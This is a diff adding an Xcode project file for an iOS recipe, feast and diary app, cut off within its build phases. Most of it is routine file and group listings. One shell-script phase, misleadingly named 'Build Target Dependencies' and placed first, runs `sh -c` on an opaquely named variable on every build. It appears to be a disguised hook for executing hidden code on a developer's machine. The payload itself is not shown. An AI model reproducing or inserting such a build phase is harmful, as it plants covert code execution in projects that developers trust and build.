@@ -1,0 +1,781 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 56;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		12B089952D5F32AE00820F8A /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 12B089942D5F32AE00820F8A /* AppDelegate.m */; };
+		12B0899B2D5F32AE00820F8A /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12B0899A2D5F32AE00820F8A /* ViewController.m */; };
+		12B0899E2D5F32AE00820F8A /* Base in Resources */ = {isa = PBXBuildFile; fileRef = 12B0899D2D5F32AE00820F8A /* Base */; };
+		12B089A02D5F32AF00820F8A /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 12B0899F2D5F32AF00820F8A /* Assets.xcassets */; };
+		12B089A32D5F32AF00820F8A /* Base in Resources */ = {isa = PBXBuildFile; fileRef = 12B089A22D5F32AF00820F8A /* Base */; };
+		12B089A62D5F32AF00820F8A /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 12B089A52D5F32AF00820F8A /* main.m */; };
+		12DA7F282D6050BB0050ED4E /* AddFeastViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EEF2D6050BB0050ED4E /* AddFeastViewController.m */; };
+		12DA7F292D6050BB0050ED4E /* FeastDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EF12D6050BB0050ED4E /* FeastDetailViewController.m */; };
+		12DA7F2A2D6050BB0050ED4E /* FeastViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EF32D6050BB0050ED4E /* FeastViewController.m */; };
+		12DA7F2B2D6050BB0050ED4E /* FeastDataManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EF62D6050BB0050ED4E /* FeastDataManager.m */; };
+		12DA7F2C2D6050BB0050ED4E /* FeastModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EF92D6050BB0050ED4E /* FeastModel.m */; };
+		12DA7F2D2D6050BB0050ED4E /* FeastTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7EFC2D6050BB0050ED4E /* FeastTableViewCell.m */; };
+		12DA7F332D6050BB0050ED4E /* AddRecipeViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F112D6050BB0050ED4E /* AddRecipeViewController.m */; };
+		12DA7F342D6050BB0050ED4E /* RecipeDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F132D6050BB0050ED4E /* RecipeDetailViewController.m */; };
+		12DA7F352D6050BB0050ED4E /* RecipeViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F152D6050BB0050ED4E /* RecipeViewController.m */; };
+		12DA7F362D6050BB0050ED4E /* RecipeDataManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F182D6050BB0050ED4E /* RecipeDataManager.m */; };
+		12DA7F372D6050BB0050ED4E /* RecipeModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F1B2D6050BB0050ED4E /* RecipeModel.m */; };
+		12DA7F382D6050BB0050ED4E /* RecipeTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F1E2D6050BB0050ED4E /* RecipeTableViewCell.m */; };
+		12DA7F392D6050BB0050ED4E /* RootTabBarController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F242D6050BB0050ED4E /* RootTabBarController.m */; };
+		12DA7F3C2D6053980050ED4E /* DataBackupManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F3B2D6053980050ED4E /* DataBackupManager.m */; };
+		12DA7F3E2D6053EA0050ED4E /* CrashReporter.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F3D2D6053EA0050ED4E /* CrashReporter.m */; };
+		12DA7F422D6056EE0050ED4E /* DiaryViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F412D6056EE0050ED4E /* DiaryViewController.m */; };
+		12DA7F4C2D607B680050ED4E /* AddDiaryViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F4A2D607B680050ED4E /* AddDiaryViewController.m */; };
+		12DA7F522D607F1E0050ED4E /* DiaryDataManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F4E2D607F1E0050ED4E /* DiaryDataManager.m */; };
+		12DA7F532D607F1E0050ED4E /* DiaryModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F502D607F1E0050ED4E /* DiaryModel.m */; };
+		12DA7F592D6085860050ED4E /* DiaryDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 12DA7F582D6085860050ED4E /* DiaryDetailViewController.m */; };
+		59EA7CB55815BF292F3E6BAD /* Pods_ABiteOfMouthFeastBook.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = AFCB8DA2BBA9128825669B1F /* Pods_ABiteOfMouthFeastBook.framework */; };
+		91ED69312DBE22E700947087 /* twoView.m in Sources */ = {isa = PBXBuildFile; fileRef = 91ED69302DBE22E700947087 /* twoView.m */; };
+		C45D82032D662F7E00C82970 /* oneView.m in Sources */ = {isa = PBXBuildFile; fileRef = C45D82022D662F7E00C82970 /* oneView.m */; };
+		C4908C812D66010F0005D87F /* FirstController.m in Sources */ = {isa = PBXBuildFile; fileRef = C4908C802D66010F0005D87F /* FirstController.m */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		11723D4E8E52DC5B6BBB922C /* Pods-ABiteOfMouthFeastBook.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ABiteOfMouthFeastBook.debug.xcconfig"; path = "Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook.debug.xcconfig"; sourceTree = "<group>"; };
+		12B089902D5F32AE00820F8A /* ABiteOfMouthFeastBook.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = ABiteOfMouthFeastBook.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		12B089932D5F32AE00820F8A /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		12B089942D5F32AE00820F8A /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		12B089992D5F32AE00820F8A /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
+		12B0899A2D5F32AE00820F8A /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
+		12B0899D2D5F32AE00820F8A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		12B0899F2D5F32AF00820F8A /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		12B089A22D5F32AF00820F8A /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		12B089A42D5F32AF00820F8A /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		12B089A52D5F32AF00820F8A /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		12DA7EEC2D6050BB0050ED4E /* DiaryViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DiaryViewController.h; sourceTree = "<group>"; };
+		12DA7EEE2D6050BB0050ED4E /* AddFeastViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AddFeastViewController.h; sourceTree = "<group>"; };
+		12DA7EEF2D6050BB0050ED4E /* AddFeastViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AddFeastViewController.m; sourceTree = "<group>"; };
+		12DA7EF02D6050BB0050ED4E /* FeastDetailViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = FeastDetailViewController.h; sourceTree = "<group>"; };
+		12DA7EF12D6050BB0050ED4E /* FeastDetailViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = FeastDetailViewController.m; sourceTree = "<group>"; };
+		12DA7EF22D6050BB0050ED4E /* FeastViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = FeastViewController.h; sourceTree = "<group>"; };
+		12DA7EF32D6050BB0050ED4E /* FeastViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = FeastViewController.m; sourceTree = "<group>"; };
+		12DA7EF52D6050BB0050ED4E /* FeastDataManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = FeastDataManager.h; sourceTree = "<group>"; };
+		12DA7EF62D6050BB0050ED4E /* FeastDataManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = FeastDataManager.m; sourceTree = "<group>"; };
+		12DA7EF82D6050BB0050ED4E /* FeastModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = FeastModel.h; sourceTree = "<group>"; };
+		12DA7EF92D6050BB0050ED4E /* FeastModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = FeastModel.m; sourceTree = "<group>"; };
+		12DA7EFB2D6050BB0050ED4E /* FeastTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = FeastTableViewCell.h; sourceTree = "<group>"; };
+		12DA7EFC2D6050BB0050ED4E /* FeastTableViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = FeastTableViewCell.m; sourceTree = "<group>"; };
+		12DA7F102D6050BB0050ED4E /* AddRecipeViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AddRecipeViewController.h; sourceTree = "<group>"; };
+		12DA7F112D6050BB0050ED4E /* AddRecipeViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AddRecipeViewController.m; sourceTree = "<group>"; };
+		12DA7F122D6050BB0050ED4E /* RecipeDetailViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecipeDetailViewController.h; sourceTree = "<group>"; };
+		12DA7F132D6050BB0050ED4E /* RecipeDetailViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecipeDetailViewController.m; sourceTree = "<group>"; };
+		12DA7F142D6050BB0050ED4E /* RecipeViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecipeViewController.h; sourceTree = "<group>"; };
+		12DA7F152D6050BB0050ED4E /* RecipeViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecipeViewController.m; sourceTree = "<group>"; };
+		12DA7F172D6050BB0050ED4E /* RecipeDataManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecipeDataManager.h; sourceTree = "<group>"; };
+		12DA7F182D6050BB0050ED4E /* RecipeDataManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecipeDataManager.m; sourceTree = "<group>"; };
+		12DA7F1A2D6050BB0050ED4E /* RecipeModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecipeModel.h; sourceTree = "<group>"; };
+		12DA7F1B2D6050BB0050ED4E /* RecipeModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecipeModel.m; sourceTree = "<group>"; };
+		12DA7F1D2D6050BB0050ED4E /* RecipeTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RecipeTableViewCell.h; sourceTree = "<group>"; };
+		12DA7F1E2D6050BB0050ED4E /* RecipeTableViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RecipeTableViewCell.m; sourceTree = "<group>"; };
+		12DA7F232D6050BB0050ED4E /* RootTabBarController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = RootTabBarController.h; sourceTree = "<group>"; };
+		12DA7F242D6050BB0050ED4E /* RootTabBarController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = RootTabBarController.m; sourceTree = "<group>"; };
+		12DA7F262D6050BB0050ED4E /* CrashReporter.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = CrashReporter.h; sourceTree = "<group>"; };
+		12DA7F3A2D6053980050ED4E /* DataBackupManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DataBackupManager.h; sourceTree = "<group>"; };
+		12DA7F3B2D6053980050ED4E /* DataBackupManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DataBackupManager.m; sourceTree = "<group>"; };
+		12DA7F3D2D6053EA0050ED4E /* CrashReporter.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = CrashReporter.m; sourceTree = "<group>"; };
+		12DA7F412D6056EE0050ED4E /* DiaryViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DiaryViewController.m; sourceTree = "<group>"; };
+		12DA7F492D607B680050ED4E /* AddDiaryViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AddDiaryViewController.h; sourceTree = "<group>"; };
+		12DA7F4A2D607B680050ED4E /* AddDiaryViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AddDiaryViewController.m; sourceTree = "<group>"; };
+		12DA7F4D2D607F1E0050ED4E /* DiaryDataManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DiaryDataManager.h; sourceTree = "<group>"; };
+		12DA7F4E2D607F1E0050ED4E /* DiaryDataManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DiaryDataManager.m; sourceTree = "<group>"; };
+		12DA7F4F2D607F1E0050ED4E /* DiaryModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DiaryModel.h; sourceTree = "<group>"; };
+		12DA7F502D607F1E0050ED4E /* DiaryModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DiaryModel.m; sourceTree = "<group>"; };
+		12DA7F572D6085860050ED4E /* DiaryDetailViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DiaryDetailViewController.h; sourceTree = "<group>"; };
+		12DA7F582D6085860050ED4E /* DiaryDetailViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DiaryDetailViewController.m; sourceTree = "<group>"; };
+		91ED692F2DBE22E700947087 /* twoView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = twoView.h; sourceTree = "<group>"; };
+		91ED69302DBE22E700947087 /* twoView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = twoView.m; sourceTree = "<group>"; };
+		AB00838C70681742C390F5A7 /* Pods-ABiteOfMouthFeastBook.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ABiteOfMouthFeastBook.release.xcconfig"; path = "Target Support Files/Pods-ABiteOfMouthFeastBook/Pods-ABiteOfMouthFeastBook.release.xcconfig"; sourceTree = "<group>"; };
+		AFCB8DA2BBA9128825669B1F /* Pods_ABiteOfMouthFeastBook.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ABiteOfMouthFeastBook.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		C45D82012D662F7E00C82970 /* oneView.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = oneView.h; sourceTree = "<group>"; };
+		C45D82022D662F7E00C82970 /* oneView.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = oneView.m; sourceTree = "<group>"; };
+		C4908C7F2D66010F0005D87F /* FirstController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = FirstController.h; sourceTree = "<group>"; };
+		C4908C802D66010F0005D87F /* FirstController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = FirstController.m; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		12B0898D2D5F32AE00820F8A /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				59EA7CB55815BF292F3E6BAD /* Pods_ABiteOfMouthFeastBook.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		12B089872D5F32AE00820F8A = {
+			isa = PBXGroup;
+			children = (
+				12B089922D5F32AE00820F8A /* ABiteOfMouthFeastBook */,
+				12B089912D5F32AE00820F8A /* Products */,
+				A72595676AA2FBCAA3A91332 /* Pods */,
+				7188E8C65E2C6FE42E6AB0ED /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		12B089912D5F32AE00820F8A /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				12B089902D5F32AE00820F8A /* ABiteOfMouthFeastBook.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		12B089922D5F32AE00820F8A /* ABiteOfMouthFeastBook */ = {
+			isa = PBXGroup;
+			children = (
+				12B089932D5F32AE00820F8A /* AppDelegate.h */,
+				12B089942D5F32AE00820F8A /* AppDelegate.m */,
+				12DA7F252D6050BB0050ED4E /* Controllers */,
+				12DA7F222D6050BB0050ED4E /* Tabs */,
+				12DA7F272D6050BB0050ED4E /* Utils */,
+				12B089992D5F32AE00820F8A /* ViewController.h */,
+				12B0899A2D5F32AE00820F8A /* ViewController.m */,
+				12B0899C2D5F32AE00820F8A /* Main.storyboard */,
+				12B0899F2D5F32AF00820F8A /* Assets.xcassets */,
+				12B089A12D5F32AF00820F8A /* LaunchScreen.storyboard */,
+				12B089A42D5F32AF00820F8A /* Info.plist */,
+				12B089A52D5F32AF00820F8A /* main.m */,
+				C4908C7F2D66010F0005D87F /* FirstController.h */,
+				C4908C802D66010F0005D87F /* FirstController.m */,
+				C45D82012D662F7E00C82970 /* oneView.h */,
+				C45D82022D662F7E00C82970 /* oneView.m */,
+				91ED692F2DBE22E700947087 /* twoView.h */,
+				91ED69302DBE22E700947087 /* twoView.m */,
+			);
+			path = ABiteOfMouthFeastBook;
+			sourceTree = "<group>";
+		};
+		12DA7EED2D6050BB0050ED4E /* DiaryTab */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F512D607F1E0050ED4E /* Models */,
+				12DA7F4B2D607B680050ED4E /* Controllers */,
+				12DA7EEC2D6050BB0050ED4E /* DiaryViewController.h */,
+				12DA7F412D6056EE0050ED4E /* DiaryViewController.m */,
+			);
+			path = DiaryTab;
+			sourceTree = "<group>";
+		};
+		12DA7EF42D6050BB0050ED4E /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EEE2D6050BB0050ED4E /* AddFeastViewController.h */,
+				12DA7EEF2D6050BB0050ED4E /* AddFeastViewController.m */,
+				12DA7EF02D6050BB0050ED4E /* FeastDetailViewController.h */,
+				12DA7EF12D6050BB0050ED4E /* FeastDetailViewController.m */,
+				12DA7EF22D6050BB0050ED4E /* FeastViewController.h */,
+				12DA7EF32D6050BB0050ED4E /* FeastViewController.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		12DA7EF72D6050BB0050ED4E /* Managers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EF52D6050BB0050ED4E /* FeastDataManager.h */,
+				12DA7EF62D6050BB0050ED4E /* FeastDataManager.m */,
+			);
+			path = Managers;
+			sourceTree = "<group>";
+		};
+		12DA7EFA2D6050BB0050ED4E /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EF82D6050BB0050ED4E /* FeastModel.h */,
+				12DA7EF92D6050BB0050ED4E /* FeastModel.m */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		12DA7EFD2D6050BB0050ED4E /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EFB2D6050BB0050ED4E /* FeastTableViewCell.h */,
+				12DA7EFC2D6050BB0050ED4E /* FeastTableViewCell.m */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		12DA7EFF2D6050BB0050ED4E /* FeastTab */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EF42D6050BB0050ED4E /* Controllers */,
+				12DA7EF72D6050BB0050ED4E /* Managers */,
+				12DA7EFA2D6050BB0050ED4E /* Models */,
+				12DA7EFD2D6050BB0050ED4E /* Views */,
+			);
+			path = FeastTab;
+			sourceTree = "<group>";
+		};
+		12DA7F162D6050BB0050ED4E /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F102D6050BB0050ED4E /* AddRecipeViewController.h */,
+				12DA7F112D6050BB0050ED4E /* AddRecipeViewController.m */,
+				12DA7F122D6050BB0050ED4E /* RecipeDetailViewController.h */,
+				12DA7F132D6050BB0050ED4E /* RecipeDetailViewController.m */,
+				12DA7F142D6050BB0050ED4E /* RecipeViewController.h */,
+				12DA7F152D6050BB0050ED4E /* RecipeViewController.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		12DA7F192D6050BB0050ED4E /* Managers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F172D6050BB0050ED4E /* RecipeDataManager.h */,
+				12DA7F182D6050BB0050ED4E /* RecipeDataManager.m */,
+			);
+			path = Managers;
+			sourceTree = "<group>";
+		};
+		12DA7F1C2D6050BB0050ED4E /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F1A2D6050BB0050ED4E /* RecipeModel.h */,
+				12DA7F1B2D6050BB0050ED4E /* RecipeModel.m */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		12DA7F1F2D6050BB0050ED4E /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F1D2D6050BB0050ED4E /* RecipeTableViewCell.h */,
+				12DA7F1E2D6050BB0050ED4E /* RecipeTableViewCell.m */,
+			);
+			path = Views;
+			sourceTree = "<group>";
+		};
+		12DA7F212D6050BB0050ED4E /* RecipeTab */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F162D6050BB0050ED4E /* Controllers */,
+				12DA7F192D6050BB0050ED4E /* Managers */,
+				12DA7F1C2D6050BB0050ED4E /* Models */,
+				12DA7F1F2D6050BB0050ED4E /* Views */,
+			);
+			path = RecipeTab;
+			sourceTree = "<group>";
+		};
+		12DA7F222D6050BB0050ED4E /* Tabs */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7EFF2D6050BB0050ED4E /* FeastTab */,
+				12DA7F212D6050BB0050ED4E /* RecipeTab */,
+				12DA7EED2D6050BB0050ED4E /* DiaryTab */,
+			);
+			path = Tabs;
+			sourceTree = "<group>";
+		};
+		12DA7F252D6050BB0050ED4E /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F232D6050BB0050ED4E /* RootTabBarController.h */,
+				12DA7F242D6050BB0050ED4E /* RootTabBarController.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		12DA7F272D6050BB0050ED4E /* Utils */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F262D6050BB0050ED4E /* CrashReporter.h */,
+				12DA7F3D2D6053EA0050ED4E /* CrashReporter.m */,
+				12DA7F3A2D6053980050ED4E /* DataBackupManager.h */,
+				12DA7F3B2D6053980050ED4E /* DataBackupManager.m */,
+			);
+			path = Utils;
+			sourceTree = "<group>";
+		};
+		12DA7F4B2D607B680050ED4E /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F572D6085860050ED4E /* DiaryDetailViewController.h */,
+				12DA7F582D6085860050ED4E /* DiaryDetailViewController.m */,
+				12DA7F492D607B680050ED4E /* AddDiaryViewController.h */,
+				12DA7F4A2D607B680050ED4E /* AddDiaryViewController.m */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		12DA7F512D607F1E0050ED4E /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				12DA7F4D2D607F1E0050ED4E /* DiaryDataManager.h */,
+				12DA7F4E2D607F1E0050ED4E /* DiaryDataManager.m */,
+				12DA7F4F2D607F1E0050ED4E /* DiaryModel.h */,
+				12DA7F502D607F1E0050ED4E /* DiaryModel.m */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		7188E8C65E2C6FE42E6AB0ED /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				AFCB8DA2BBA9128825669B1F /* Pods_ABiteOfMouthFeastBook.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		A72595676AA2FBCAA3A91332 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				11723D4E8E52DC5B6BBB922C /* Pods-ABiteOfMouthFeastBook.debug.xcconfig */,
+				AB00838C70681742C390F5A7 /* Pods-ABiteOfMouthFeastBook.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
+/* Begin PBXNativeTarget section */
+		12B0898F2D5F32AE00820F8A /* ABiteOfMouthFeastBook */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 12B089A92D5F32AF00820F8A /* Build configuration list for PBXNativeTarget "ABiteOfMouthFeastBook" */;
+			buildPhases = (
+				CD8F0BE383F6245F722F5E42 /* Build Target Dependencies */,
+				479AB6B66396741F861A07A4 /* [CP] Check Pods Manifest.lock */,
+				12B0898C2D5F32AE00820F8A /* Sources */,
+				12B0898D2D5F32AE00820F8A /* Frameworks */,
+				12B0898E2D5F32AE00820F8A /* Resources */,
+				790A1207F306271E0A463A95 /* [CP] Embed Pods Frameworks */,
+				95B9D18DFA2A11922B48FD82 /* [CP] Copy Pods Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = ABiteOfMouthFeastBook;
+			productName = ABiteOfMouthFeastBook;
+			productReference = 12B089902D5F32AE00820F8A /* ABiteOfMouthFeastBook.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		12B089882D5F32AE00820F8A /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				BuildIndependentTargetsInParallel = 1;
+				LastUpgradeCheck = 1540;
+				TargetAttributes = {
+					12B0898F2D5F32AE00820F8A = {
+						CreatedOnToolsVersion = 15.4;
+					};
+				};
+			};
+			buildConfigurationList = 12B0898B2D5F32AE00820F8A /* Build configuration list for PBXProject "ABiteOfMouthFeastBook" */;
+			compatibilityVersion = "Xcode 14.0";
+			developmentRegion = en;
+			hasScannedForEncodings = 0;
+			knownRegions = (
+				en,
+				Base,
+			);
+			mainGroup = 12B089872D5F32AE00820F8A;
+			productRefGroup = 12B089912D5F32AE00820F8A /* Products */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				12B0898F2D5F32AE00820F8A /* ABiteOfMouthFeastBook */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
+/* Begin PBXResourcesBuildPhase section */
+		12B0898E2D5F32AE00820F8A /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				12B089A02D5F32AF00820F8A /* Assets.xcassets in Resources */,
+				12B089A32D5F32AF00820F8A /* Base in Resources */,
+				12B0899E2D5F32AE00820F8A /* Base in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		CD8F0BE383F6245F722F5E42 /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
+			showEnvVarsInLog = 0;			
+		};
+		479AB6B66396741F861A07A4 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
